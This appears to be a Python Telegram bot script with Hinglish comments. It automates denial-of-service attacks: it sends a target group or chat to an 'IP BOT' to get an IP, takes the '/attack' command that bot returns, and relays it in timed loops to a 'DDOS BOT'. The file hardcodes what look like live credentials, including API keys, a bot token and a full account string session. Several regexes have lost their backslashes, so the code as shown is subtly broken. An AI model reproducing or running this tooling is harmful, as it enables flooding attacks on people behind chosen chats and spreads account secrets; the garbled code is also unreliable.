import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT

STRING_SESSION = "1BVtsOKEBu3SYroI3IJ6zS5X-kzvIX0XMORQbsB5bmGunhKXFhuSTmZ5OaY6mwlv7BbH30ioIX_07Kf8PCXsDTLrerGDpNnqi43ocShtp7rypEXpi1o2Pqo-XKVoIkxs2-mkmME0bJEyIN5l1o96eipA3dsUvGYHexSlA4nLfUhmZcs-hXrZ0QGO4PcZa8lXWniG3FH8mlj_aQR1If44tl4nRCcT_XZ8lYWGq9ieqzbpPuiWiA609IbmxM9dQQhU9YBBYKajgaKD2ONSfxqqp87YZdK0Y7DUe84yi1U6wDX39M45wif8RhN0Kgvk7QeIf7FAcEukvaulOW5H4WP74krOwK3JKHlo="

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# state
chat_targets: dict[int, str] = {}
chat_counts: dict[int, int] = {}
ip_waiters: dict[int, asyncio.Future] = {}
bot_b_status = "UNKNOWN"
auto_running: dict[int, bool] = {}   # <-- naya flag per chat


# ---------- LISTENERS ----------
@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    text = event.text or ""
    print("📩 IP BOT REPLY:", repr(text))

    m_line = re.search(r"CMD:s*(.+)", text)
    if not m_line:
        return

    line = m_line.group(1).strip()

    m_cmd = re.search(r"`([^`]+)`", line)
    if m_cmd:
        raw_cmd = m_cmd.group(1).strip()
    else:
        raw_cmd = line.lstrip("* ").strip()

    m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
    if m_attack:
        final_cmd = m_attack.group(1).strip()
    else:
        final_cmd = raw_cmd

    print("✅ FINAL CMD:", final_cmd)

    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    text = event.text or ""
    low = text.lower()
    print("DDOS BOT MSG:", repr(text))

    if (
        "✅ **ʀᴇᴀᴅʏ**" in text
        or "no attack running" in low
        or "you can start a new attack" in low
    ):
        bot_b_status = "READY"
    elif (
        "attack started" in low
        or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
        or "starting attack" in low
        or "sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ" in text
        or "attack running" in low
        or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
    ):
        bot_b_status = "RUNNING"
    elif "cooldown" in low or "⏳" in text:
        bot_b_status = "COOLDOWN"
    else:
        pass


# ---------- SINGLE ROUND ----------
async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    target = chat_targets.get(chat_id)
    if not target:
        await context.bot.send_message(
            chat_id,
            "❌ Target not set, use /setlinkchatid first."
        )
        return

    await context.bot.send_message(
        chat_id,
        f"➡️ Getting IP & CMD for `{target}`…",
        parse_mode="Markdown",
    )

    loop = asyncio.get_running_loop()
    fut = loop.create_future()
    ip_waiters[chat_id] = fut

    await tele.send_message(BOT_A, f".getip all {target}")

    try:
        final_cmd = await asyncio.wait_for(fut, timeout=60)
    except asyncio.TimeoutError:
        await context.bot.send_message(
            chat_id,
            "⏱️ Timeout: No CMD from IP BOT, skipping this attack…"
        )
        ip_waiters.pop(chat_id, None)
        return

    await context.bot.send_message(
        chat_id,
        f"📥 CMD from IP BOT:`{final_cmd}`",
        parse_mode="Markdown",
    )

    await tele.send_message(BOT_B, final_cmd)
    await context.bot.send_message(
        chat_id,
        f"🚀 Sent to DDOS BOT:`{final_cmd}`",
        parse_mode="Markdown",
    )


# ---------- AUTO LOOP (stop-able) ----------
async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    count = chat_counts.get(chat_id, 1)
    delay = 45  # seconds

    # Agar already running hai to dobara start na ho
    if auto_running.get(chat_id):
        await update.message.reply_text("⚠️ Auto loop already running in this chat.")
        return

    auto_running[chat_id] = True

    await update.message.reply_text(
        f"🔁 Auto loop starting.Attacks: {count}Delay: {delay}s between each."
    )

    for i in range(count):
        # Har round se pehle check karo flag off to nahi hua
        if not auto_running.get(chat_id):
            await update.message.reply_text("🛑 Auto loop stopped.")
            break

        await update.message.reply_text(f"▶️ Attack {i + 1}/{count} starting…")
        await single_round(chat_id, context)

        if i != count - 1:
            if not auto_running.get(chat_id):
                await update.message.reply_text("🛑 Auto loop stopped.")
                break
            await update.message.reply_text(
                f"⏳ Waiting {delay}s before next attack…"
            )
            # Delay ke beech bhi thoda‑thoda check
            for _ in range(delay):
                if not auto_running.get(chat_id):
                    await update.message.reply_text("🛑 Auto loop stopped during delay.")
                    break
                await asyncio.sleep(1)
            if not auto_running.get(chat_id):
                break

    auto_running[chat_id] = False
    if auto_running.get(chat_id) is False:
        await update.message.reply_text("✅ Auto loop finished.")


# ---------- START COMMAND ----------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
👋 Welcome!

Available commands:
/setlinkchatid <link_or_chatid> - Target group/chat set karo
/setcount <number_of_attacks>  - Attacks ka count set karo
/startloop                     - Ek single attack round
/autoloop                      - setcount ke hisaab se auto attacks
/stoploop                      - Auto loop ko beech me stop karo
"""
    await update.message.reply_text(text.strip())


# ---------- PTB COMMANDS ----------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
        return
    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Link / ChatID saved")


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcount <number_of_attacks>")
        return
    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await update.message.reply_text(f"✅ Count set to {n}")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await single_round(update.effective_chat.id, context)


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if auto_running.get(chat_id):
        auto_running[chat_id] = False
        await update.message.reply_text("🛑 Stop signal sent. Waiting for current step to finish…")
    else:
        await update.message.reply_text("ℹ️ No auto loop running in this chat.")


# ---------- MAIN ----------
async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("autoloop", autoloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())